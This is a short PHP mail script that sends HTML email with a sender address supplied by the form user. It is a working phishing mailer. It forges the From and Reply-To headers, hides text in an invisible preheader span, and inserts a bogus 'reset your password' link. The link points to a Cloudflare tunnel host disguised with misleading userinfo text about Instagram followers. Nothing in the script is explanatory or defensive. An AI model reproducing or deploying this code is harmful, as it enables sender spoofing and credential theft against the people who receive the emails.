<?php
if (isset($_POST['sendMailBtn'])) {
    $fromEmail = $_POST['fromEmail'];
    $toEmail = $_POST['toEmail'];
    $subjectName = $_POST['subject'];
    $message = $_POST['message'];

    $to = $toEmail;
    $subject = $subjectName;
//    $headers = "MIME-Version: 1.0" . "\r\n";
//    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
//    $headers .= 'From: '.$fromEmail.'<'.$fromEmail.'>' . "\r\n".'Reply-To: '.$fromEmail."\r\n" . 'X-Mailer: PHP/' . phpversion();
//    $message = '<!doctype html>
//			<html lang="en">
//			<head>
//				<meta charset="UTF-8">
//				<meta name="viewport"
//					  content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
//				<meta http-equiv="X-UA-Compatible" content="ie=edge">
//				<title>Document</title>
//			</head>
//			<body>
//			<span class="preheader" style="color: transparent; display: none; height: 0; max-height: 0; max-width: 0; opacity: 0; overflow: hidden; mso-hide: all; visibility: hidden; width: 0;">'.$message.'</span>
//				<div class="container">
//                 '.$message.'<br/>
//                    Regards<br/>
//                  '.$fromEmail.'
//				</div>
//			</body>
//			</html>';

//    $message = "The body of the message";
//    $message = wordwrap($message, 70, "\r\n");

    $message = '<!doctype html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta name="viewport"
					  content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
				<meta http-equiv="X-UA-Compatible" content="ie=edge">
				<title>Document</title>
			</head>
			<body>
			<span class="preheader" style="color: transparent; display: none; height: 0; max-height: 0; max-width: 0; opacity: 0; overflow: hidden; mso-hide: all; visibility: hidden; width: 0;">'.$message.'</span>
				<div class="container">
                 '.$message.'<br/><br>
                 Please click the link below to reset your password <br>
                 <a href="http://get-unlimited-followers-for-instagram@salary-chuck-location-conflicts.trycloudflare.com">Click here!</a><br><br>
                    Regards,<br/><br>
                 '.$to.'
                  
				</div>
			</body>
			</html>';
    $headers = 'From: register@mrgarretto.com' . "\r\n" .
        'Reply-To: register@mrgarretto.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .=  "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= 'From: '.$fromEmail.'<'.$fromEmail.'>' . "\r\n".'Reply-To: '.$fromEmail."\r\n" . 'X-Mailer: PHP/' . phpversion();
    $mailResult = mail($to, $subject, $message, $headers);
//    $result = mail($to, $subject, $message, $headers);

    echo '<script>alert("Email sent successfully !")</script>';
    echo '<script>window.location.href="index.php";</script>';
}